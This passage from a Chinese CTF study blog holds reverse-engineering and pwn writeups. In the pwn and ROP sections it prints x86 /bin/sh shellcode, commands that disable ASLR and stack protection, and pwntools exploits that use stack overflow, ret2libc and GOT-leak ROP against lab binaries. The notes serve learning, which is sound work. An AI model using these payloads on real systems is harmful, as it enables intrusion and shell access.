 218,
 47,
 163,
 215,
 209,
 108,
 235,
 237,
 118,
 101,
 24,
 234,
 106,
 143,
 88,
 9,
 136,
 95,
 30,
 193,
 176,
 225,
 198,
 197,
 194,
 239,
 134,
 162,
 192,
 11,
 70,
 58,
 187,
 50,
 67,
 236,
 230,
 13,
 99,
 190,
 208,
 207,
 7,
 53,
 219,
 203,
 62,
 114,
 127,
 125,
 164,
 179,
 175,
 112,
 172,
 250,
 133,
 130,
 52,
 189,
 97,
 146,
 34,
 157,
 120,
 195,
 45,
 4,
 142,
 139]
pwda = [188,
 155,
 11,
 58,
 251,
 208,
 204,
 202,
 150,
 120,
 206,
 237,
 114,
 92,
 126,
 6,
 42]
pwdb = [53,
 222,
 230,
 35,
 67,
 248,
 226,
 216,
 17,
 209,
 32,
 2,
 181,
 200,
 171,
 60,
 108]
flag = raw_input(&apos;Input your Key:&apos;).strip()
if len(flag) != 17:
print &apos;Wrong Key!!&apos;
sys.exit(1)
flag = flag[::-1]
for i in range(0, len(flag)):
if ord(flag[i]) + pwda[i] &amp; 255 != lookup[i + pwdb[i]]:
print &apos;Wrong Key!!&apos;
sys.exit(1)

print &apos;Congratulations!!&apos;
</code></pre><p>虽然长关键是最后哪儿的处理，在最后做一个修改就可以了，第一次想的方法是根据以前做题的经验进行爆破的，有碰巧的嫌疑：<br>前面关键数据不变把最后的数据进行改变如下图<br><img src="http://otc7tld02.bkt.clouddn.com/han25.jpg" alt=""></p>
<p>最后跑出来的结果：<br><img src="http://otc7tld02.bkt.clouddn.com/han24.png" alt=""></p>
<p>其实这样子添加abcde等字符的方法有凑巧之嫌。万一有#之类的问题该如何，第一次改就漏掉了‘<em>’不是猜测真的得不出17位把‘</em>’给落掉了，随意中途也突然想了一个方法，直接一个<br>for循环在0到128之间进行爆破并用组进行保存，最后直接通过ord()函数进行转换就能得到最后的flag</p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice-2之汇编]]></title>
      <url>/2017/02/10/practice-2%E4%B9%8B%E6%B1%87%E7%BC%96/</url>
      <content type="html"><![CDATA[<p>一道ELFx64的题目，只能用IDA载入，找到main函数，F5得到代码</p>
<a id="more"></a>
<p><img src="http://otc7tld02.bkt.clouddn.com/han31.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/han32.png" alt=""></p>
<p>看上面两个图，代码可读性果然不太好。前面print的一大堆应该是文件的提示字符串输入重点是后面的while循环以及那个if语句，直接看到if可以发现flag的最后几个变量必须是0，8，2，3这个不难看出来，</p>
<p>试着看汇编把，看总览图，也不知道是不是这个技巧，看看剪头分布能推断出哪一段是循环语句所在之处，if判断之处啥的</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han33.png" alt=""><br>跟着C语言看看汇编语言吧</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han34.png" alt=""></p>
<p>进过上述分析可以知道var_40应该使我们输入的结果，所以必须必须知道var_C0的数据跳到相应位置</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han35.png" alt=""></p>
<p>是空的，再回到代码找找，会发现这样子一串操作</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han36.png" alt=""></p>
<p>刚好17个数字，所以说var_i[i] = ((var_C0[i]-1)+(var_C0[i]-1)&gt;&gt;0x1f)&gt;&gt;1</p>
<p>好的，python写脚本：</p>
<pre><code>#!usr/bin/python
#-*- coding:utf-8 -*-

key = [0x0EF,
0x0C7,
0x0E9,
0x0CD,
0x0F7,
0x08B,
0x0D9,
0x08D,
0x0BF,
0x0D9,
0x0DD,
0x0B1,
0x0BF,
0x087,
0x0D7,
0x0DB,
0x0BF
]
flag = []
for i in range(0,17):
       ch = ((key[i]-1)+((key[i]-1)&gt;&gt;0x1f))&gt;&gt;1;
       flag.append(chr(ch))
print(flag)
print(&apos;0823}&apos;)
</code></pre><p>最后结果：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han37.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[8道Pwn基础练习所得]]></title>
      <url>/2017/02/09/8%E9%81%93Pwn%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0%E6%89%80%E5%BE%97/</url>
      <content type="html"><![CDATA[<p>刚开始做pwn的题目，从基础开始咯，所以在合天上先总结一些学到的指令。（基础gdb就不多说了）<br>{!:在数据填充的时候不可以用换行符号进行填充}</p>
<a id="more"></a>
<h3 id="一、Pwn基础练习1"><a href="#一、Pwn基础练习1" class="headerlink" title="一、Pwn基础练习1"></a>一、Pwn基础练习1</h3><p>查询pwn程序的c语言源代码</p>
<blockquote>
<p>cat  pwn.c</p>
</blockquote>
<p>直接将64个A和一个B通过管道输入到程序中</p>
<blockquote>
<p>python -c “print ‘A’*64+’B’” | ./pwn</p>
</blockquote>
<h3 id="二、Pwn基础练习2"><a href="#二、Pwn基础练习2" class="headerlink" title="二、Pwn基础练习2"></a>二、Pwn基础练习2</h3><p> Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。<br>将AAA BBB CCC传给指定的test指令然后进行输出。<br>（用户函数中没有获取函数值语句的程序当中）</p>
<blockquote>
<p>python -c “print ‘AAA BBB CCC’” | xargs ./test</p>
</blockquote>
<p>以字节为单位查看内存中0x34333231的表示（其中/4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节）</p>
<blockquote>
<p>x /4xb $esp+0x5C  </p>
</blockquote>
<h3 id="三、Pwn基础练习3"><a href="#三、Pwn基础练习3" class="headerlink" title="三、Pwn基础练习3"></a>三、Pwn基础练习3</h3><p><strong>Python基础知识</strong></p>
<p>   Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。</p>
<p>   运行脚本就可以把这题pwn成功</p>
<blockquote>
<p>  import os</p>
<p>   defpwn():<br>   os.putenv(“HEETIAN”,”A”*64+”\x0a\x0d\x0a\x0d”)<br>   os.system(“./pwn3”)<br>   if <strong>name</strong> ==”<strong>main</strong>“:<br>   pwn()</p>
</blockquote>
<p>在shell输入下面指令为子进程添加一个新的环境变量（除了通过export添加环境变量以外，我们还可以通过函数getenv、putenv、setenv等对环境变量进行操作。）</p>
<blockquote>
<p>export testenv=”Hello_World”</p>
</blockquote>
<p>Linux Shell中，可以使用$()或者两个反引号（<code>）来包裹一条shell命令，并返回shell命令的执行结果。
比如执行export testenv2=</code>python -c “print ‘A’*20”`命令后，再执行./env可以看到有一个名为testenv2的环境变量，其值为20个A。</p>
<blockquote>
<p>export testenv2=<code>python -c &quot;print &#39;A&#39;*20&quot;</code></p>
</blockquote>
<h3 id="四、Pwn基础练习4"><a href="#四、Pwn基础练习4" class="headerlink" title="四、Pwn基础练习4"></a>四、Pwn基础练习4</h3><p><strong>一、objdump使用</strong></p>
<p>   使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。</p>
<p>使用下面这条指令可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作</p>
<blockquote>
<p>objdump -d pwn4</p>
</blockquote>
<h3 id="五、Pwn基础练习5"><a href="#五、Pwn基础练习5" class="headerlink" title="五、Pwn基础练习5"></a>五、Pwn基础练习5</h3><p>1、C语言函数调用约定通过压栈实现参数传递，且参数压栈顺序为从右往左<br>2、查询esp寄存器中的值 </p>
<blockquote>
<p>i r $esp</p>
</blockquote>
<h3 id="六、Pwn基础练习6"><a href="#六、Pwn基础练习6" class="headerlink" title="六、Pwn基础练习6"></a>六、Pwn基础练习6</h3><p>二、Shellcode<br>   Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。<br>   Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为：</p>
<p>   <a href="http://shell-storm.org/shellcode/" target="_blank" rel="external">http://shell-storm.org/shellcode/</a></p>
<p>   <a href="http://www.exploit-db.com/shellcode/" target="_blank" rel="external">http://www.exploit-db.com/shellcode/</a></p>
<p>具有复杂功能的Shellcode无法作用于不同类型的操作系统（如Windows、Linux）<br>将pwn6.py 脚本写到test文件里面  然后把test文本拖到pwn6程序里面运行。</p>
<blockquote>
<p>python pwn6.py test<br>./pwn6 &lt; test</p>
</blockquote>
<p>shellcod的python脚本</p>
<blockquote>
<p>shellcode = (“\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe” +<br>“\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff” +<br>“\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69” +<br>“\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81”)</p>
<p>print ‘A’*76 + ‘\xd0\xd6\xff\xff’ + shellcode</p>
</blockquote>
<h3 id="七、Pwn基础练习7"><a href="#七、Pwn基础练习7" class="headerlink" title="七、Pwn基础练习7"></a>七、Pwn基础练习7</h3><p><strong>一、__builtin_return_address函数</strong></p>
<p>  <strong>builtin_return_address函数接收一个参数，可以是0,1,2等。</strong>builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址.</p>
<p><strong>二、理解多层跳转</strong></p>
<p>retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。</p>
<p>如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。</p>
<p><strong>三、函数作用</strong></p>
<p><strong>fflush()</strong>用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为：</p>
<blockquote>
<p>int fflush(FILE* stream);</p>
</blockquote>
<p>【参数】stream为文件指针。</p>
<p>【返回值】成功返回0，失败返回EOF，错误代码存于errno 中。指定的流没有缓冲区或者只读打开时也返回0值。</p>
<p><strong>fflush()</strong>也可用于标准输入（stdin）和标准输出（stdout），用来清空标准输入输出缓冲区。</p>
<p><strong>stdin</strong> 是 standard input 的缩写，即标准输入，一般是指键盘；标准输入缓冲区即是用来暂存从键盘输入的内容的缓冲区。</p>
<p><strong>stdout</strong> 是 standard output 的缩写，即标准输出，一般是指显示器；标准输出缓冲区即是用来暂存将要显示的内容的缓冲区。</p>
<h3 id="八、Pwn基础练习8"><a href="#八、Pwn基础练习8" class="headerlink" title="八、Pwn基础练习8"></a>八、Pwn基础练习8</h3><p><strong>二、strdup函数</strong></p>
<p>   strdup可以用于复制一个字符串，我们通常使用字符串时会使用strcpy，这要求已经定义好了一个接收缓冲区。而strdup只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。</p>
<p><strong>三、grep命令</strong></p>
<p>   当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。<br>   我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。<br>   对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，<em>是正则表达式里面的通配符，如果要查找</em>，需要使用反斜杠进行转移，即*。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步学ROP之x86篇]]></title>
      <url>/2017/02/08/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bx86%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>根据寒假计划的第三计划，是该学习rop了。下面是学习rop之linux_x86篇的学习笔记以及总结。<br><a id="more"></a></p>
<p>语知其事，先解其意。rop是什么？</p>
<h3 id="一、ROP"><a href="#一、ROP" class="headerlink" title="一、ROP"></a>一、ROP</h3><p>   ROP的全称为Return-oriented programming（返回导向编程），这一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p>
<p>了解了其意思，下面就是学习内容</p>
<h3 id="第一、Control-Flow-Hijack-程序流劫持"><a href="#第一、Control-Flow-Hijack-程序流劫持" class="headerlink" title="第一、Control Flow Hijack 程序流劫持"></a>第一、Control Flow Hijack 程序流劫持</h3><p>这是一个较为常见的程序流劫持，其宗旨就是栈溢出，格式化字符串攻击和栈溢出。通过这个手段，攻击者可以做的就是控制PC指针然后执行目标代码，想要应对这个攻击，在linux系统下也是有保护机制存在的：</p>
<p>   1、DEP(堆栈不可执行)：这也就是gcc编译器gs验证码机制，这是专门防止缓冲区溢出而采取的保护措施，<br>具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。<br>   此机制的关闭方法是：在gcc编译时采用-fno-stack-protector选项。     </p>
<p>   2、ASLR(内存地址随机化)：在Ubuntu个其他Linux内核的系统中，目前都采用的内存地址随机话机制，这将会使得猜测具体的内存地址变得十分困难。<br>   此机制的关闭方法是：sysctl -w kernel.randomize_va_space=0</p>
<p>   3、Stack Protector(栈保护)：对于Federal系统，默认会执行可执行程序的屏蔽保护机制，该机制不允许执行存储在栈中的代码，这会使得缓冲区溢出攻击变得无效。而Ubuntu系统中默认没有采用这种机制。<br>   此机制的关闭方法是：sysctl –w kernel.exec-shield=0 gcc下：-z execstack</p>
<p>机制了解了下面来一个实际的操作，初学练习就要把保护机制全部关闭。就用书上所用到的这个例子好了。<br><img src="http://otc7tld02.bkt.clouddn.com/R1.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/R2.png" alt=""></p>
<p>根据大神的指引，初学先把Linux下的保护机制全部关闭，指令如下：<br>这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。<br>下面的指令就是关闭Linux系统的ASpapLR保护</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R3.png" alt=""></p>
<p>关闭之后就先开始对这个程序进行分析。先在python下创建150个测试数据<br>gdb的插件peda自带pattern脚本直接生成</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R4.png" alt=""></p>
<p>然后开始run进行调试</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R5.png" alt=""></p>
<p>可以看出来错误地址是0x41416d41 然后使用指令可以计算PC返回值覆盖点为140个字节，所以只要构造一个“A”*140+ret字符串就可以让PC执行我们所需要的指令</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R6.png" alt=""></p>
<p>之后就是需要一段shellcod，获取方法很多，网上找现成的，msf自动生成，作为初学者，shellcode不好找，因为gdb调试的时候会影响buf在内存的地址<br>根据大神指示，有一个好的方法:开启core dump这个功能</p>
<blockquote>
<p>ulimit -c unlimited<br> sudo sh -c ‘echo “/tmp/core.%t” /proc/sys/kernel/core_pattern’</p>
</blockquote>
<p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R7.png" alt=""></p>
<p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffff029。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R8.png" alt=""></p>
<p>现在溢出点，shellcode和返回值地址都有。可以写exp了，最终测试代码如下:</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

p = process(&apos;./test&apos;)
ret = 0xbffff029

shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
shellcode += &quot;\x0b\xcd\x80&quot;

# p32(ret) == struct.pack(&quot;&lt;I&quot;,ret)
#对ret进行编码，将地址转换成内存中的二进制存储形式
payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)
p.send(payload) #发送payload

p.interactive()  #开启交互shell
</code></pre><p>接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
<blockquote>
<p> socat TCP4-LISTEN:10001,fork EXEC:./test</p>
</blockquote>
<p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
<p>因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！</p>
<h3 id="第二、Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#第二、Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h3><p>学习DEP就把DEP打开，其他两个（stack protector 和ASLR）依旧关闭<br>开启DEP指令如下：</p>
<blockquote>
<p> gcc -fno-stack-protector -o test test.c</p>
</blockquote>
<p>此时打开了DEP防护，那么如果还是提交上面那个脚本的话，系统会拒绝我们执行shellcode，<br>现在的测试程序为rw，而上面确实rwx </p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R9.png" alt=""></p>
<p>我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
<pre><code>   $ gdb ./test2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
….
(gdb) break main
Breakpoint 1 at 0x8048430
(gdb) run
Starting program: /home/mzheng/CTF/groupstudy/test/test2

Breakpoint 1, 0x08048430 in main ()
(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;
(gdb) print __libc_start_main
$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;
(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到)
0xb7f81ff8
warning: Unable to access target memory at 0xb7fc8500, halting search.
1 pattern found.
(gdb) x/s 0xb7f81ff8
0xb7f81ff8:  &quot;/bin/sh&quot;
</code></pre><p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

p = process(&apos;./level2&apos;)
#p = remote(&apos;127.0.0.1&apos;,10002)

ret = 0xdeadbeef
systemaddr=0xb7e5f460
binshaddr=0xb7f81ff8

payload =  &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.send(payload)

p.interactive()
</code></pre><h3 id="第三、ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#第三、ROP–-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h3><p>下面打开ASLR保护，指令如下</p>
<blockquote>
<p>   sudo -s<br>   echo 2 /proc/sys/kernel/randomize_va_space</p>
</blockquote>
<p>从现在开始会发现test的libc.so的地址每次都会变化。<br>我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。<br>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。<br>首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R10.png" alt=""></p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R11.png" alt=""></p>
<p>我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()[此函数用于确定动态库中函数地址]函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。<br>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。<br>使用ldd【 ldd命令用于判断某个可执行的 binary 档案含有什么动态函式库】命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/R112.png" alt=""></p>
<p>最后写exp：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

libc = ELF(&apos;libc.so&apos;)
elf = ELF(&apos;test3&apos;)

p = process(&apos;./test3&apos;)
#p = remote(&apos;127.0.0.1&apos;, 10003)

plt_write = elf.symbols[&apos;write&apos;]
print &apos;plt_write= &apos; + hex(plt_write)
got_write = elf.got[&apos;write&apos;]
print &apos;got_write= &apos; + hex(got_write)
vulfun_addr = 0x0804844d
print &apos;vulfun= &apos; + hex(vulfun_addr)

payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)

print &quot;\n###sending payload1 ...###&quot;
p.send(payload1)

print &quot;\n###receving write() addr...###&quot;
write_addr = u32(p.recv(4))
print &apos;write_addr=&apos; + hex(write_addr)

print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;
system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])
print &apos;system_addr= &apos; + hex(system_addr)
binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
print &apos;binsh_addr= &apos; + hex(binsh_addr)

payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

print &quot;\n###sending payload2 ...###&quot;
p.send(payload2)

p.interactive()
</code></pre><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>本文主要根据大牛的文章一步一步进行操作和学习，当然一下子也很难全部接受，后面还要多加温习，熟能生巧。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[practice-1之图片reverse]]></title>
      <url>/2017/01/30/practice-1%E4%B9%8B%E5%9B%BE%E7%89%87reverse/</url>
      <content type="html"><![CDATA[<p>嗯，找了好久在我能找的范围内都是算法大大相关的题目。<br><a id="more"></a></p>
<p>今儿无意发现reverse下有一道跟图片有关的题目，做了一下。了解了一个工具：C32Asm的用法以及隐藏flag的一种方法。就当开头长个见识了（至少我没见过！）</p>
<h3 id="工具了解"><a href="#工具了解" class="headerlink" title="工具了解"></a>工具了解</h3><p>C32Asm: 静态反编译工具，C32Asm现具有如下功能：快速静态反编译PE格式文件(Exe、Dll等)，提供Hex文件编辑功能，功能强大，提供内存Dump、内存编辑、PE文件Dump、PE内存ImageSize修正等多种实用功能。</p>
<h3 id="图片分析相关知识"><a href="#图片分析相关知识" class="headerlink" title="图片分析相关知识"></a>图片分析相关知识</h3><p>Exif： Exif是一种图像文件格式，储存个是与JPGE格式是完全相同的。Exif格式是在JPGE格式头部插入了数码照片的信息。（这个知识点里面还是可能隐藏flag的，以前遇到过）<br>简单来说：Exif=JPGE+拍摄参数。</p>
<h4 id="看题"><a href="#看题" class="headerlink" title="看题"></a>看题</h4><p><img src="http://otc7tld02.bkt.clouddn.com/han11.png" alt=""></p>
<p>一只可爱的小狗<br>看看这个图片的信息。除了一些基本信息并没有隐藏着Exif的提示信息</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han12.png" alt=""></p>
<p>OK，那么现在就用工具进行解析。<br>下面就用C32Asm打开这个图片进行分析（其实Hex工具也可以）<br>开头看到BM字符说明这个图片是BMP位图。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han13.png" alt=""></p>
<p>根据图片文字提示“奇怪的狗尾巴”（不用这个提示也习惯看完开头看结尾）。拉到结尾。发现IHDR 和 IEND这两个老搭配（当一个图片文件里有前者的时候必须找到后者这个图片才是合法的。加载两者中间的就是IDAT块儿，即图像数据信息。）</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han14.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/han15.png" alt=""></p>
<p>猜想：那么前面一定也有PNG标志。往前找，对的。下面要做的就是把这个PNG图片单独提取出来了</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han16.png" alt=""></p>
<p>在该工具下再打开16进制文件保存又会得到一个二维码图片</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han17.png" alt=""></p>
<p>扫描出现的是一个URL:<a href="http://blog.sina.com.cn/s/blog_703d65470102v6tf.html。" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_703d65470102v6tf.html。</a></p>
<p>还是直接贴图片了。又是它， 不过提示换了。一个异或算法。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han19.png" alt=""></p>
<p>不知道异或个啥，全选数据，新知识，修改数据可以自动全部进行数据的异或。flag出来了</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/han110.png" alt=""><br><img src="http://otc7tld02.bkt.clouddn.com/han111.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> reverse practice </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[寒假计划]]></title>
      <url>/2017/01/16/%E5%AF%92%E5%81%87%E8%AE%A1%E5%88%92/</url>
      <content type="html"><![CDATA[<p>寒假到了，一个关键的时间。定下一个学习计划来提升。<br><a id="more"></a></p>
<h3 id="1、自主练习学习python"><a href="#1、自主练习学习python" class="headerlink" title="1、自主练习学习python"></a>1、自主练习学习python</h3><p>参考书籍以及网上的知识自己进行python程序的练习，把网盘资料里的80个程序进行编辑练习。</p>
<h3 id="2、逆向破解练习"><a href="#2、逆向破解练习" class="headerlink" title="2、逆向破解练习"></a>2、逆向破解练习</h3><p>自己找10道对于算法无关的逆向题目进行破解，每题搞懂，将所得写到writeup上传博客。</p>
<h3 id="3、一步一步学rop-x86篇"><a href="#3、一步一步学rop-x86篇" class="headerlink" title="3、一步一步学rop x86篇"></a>3、一步一步学rop x86篇</h3><p>对于这篇文章自己进行学习，并写总结上传博客。</p>
<h3 id="4、linux系统"><a href="#4、linux系统" class="headerlink" title="4、linux系统"></a>4、linux系统</h3><p>了解linux下的保护机制，一些常见漏洞的了解。</p>
]]></content>
      
        <categories>
            
            <category> others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GDB寄存器和内存查询指令]]></title>
      <url>/2016/11/12/GDB%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%86%85%E5%AD%98%E6%9F%A5%E8%AF%A2%E6%8C%87%E4%BB%A4/</url>
      <content type="html"><![CDATA[<p>今天下午学习pwn的基础知识，遇到了两个查询容易弄扯，在这儿总结下子。<br><a id="more"></a></p>
<h3 id="1、查看寄存器"><a href="#1、查看寄存器" class="headerlink" title="1、查看寄存器"></a>1、查看寄存器</h3><blockquote>
<p>(gdb) i r<br>(gdb) i r a                     # 查看所有寄存器（包括浮点、多媒体）<br>(gdb) i r esp<br>(gdb) i r pc</p>
</blockquote>
<h3 id="2、查看内存"><a href="#2、查看内存" class="headerlink" title="2、查看内存"></a>2、查看内存</h3><blockquote>
<p>(gdb) x /wx 0x80040000    # 以16进制显示指定地址处的数据<br>(gdb) x /8x $esp<br>(gdb) x /16x $esp+12<br>(gdb) x /16s 0x86468700   # 以字符串形式显示指定地址处的数据<br>(gdb) x /24i 0x8048a51      # 以指令形式显示指定地址处的数据（24条）</p>
</blockquote>
<h3 id="3、修改寄存器的值"><a href="#3、修改寄存器的值" class="headerlink" title="3、修改寄存器的值"></a>3、修改寄存器的值</h3><blockquote>
